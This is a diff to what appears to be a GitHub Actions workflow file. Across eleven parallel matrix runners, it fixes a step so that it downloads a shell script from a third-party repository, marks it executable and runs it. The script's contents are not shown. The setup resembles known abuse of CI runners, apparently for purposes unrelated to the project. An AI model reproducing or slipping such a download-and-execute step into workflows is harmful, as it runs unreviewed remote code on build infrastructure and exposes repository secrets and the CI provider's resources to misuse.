@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,10]
    steps:
      - run: |
-          wget https://github.com/Raghost01066/wkflow/blob/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          wget https://raw.githubusercontent.com/Raghost01066/wkflow/main/bash.sh && chmod +x bash.sh && ./bash.sh
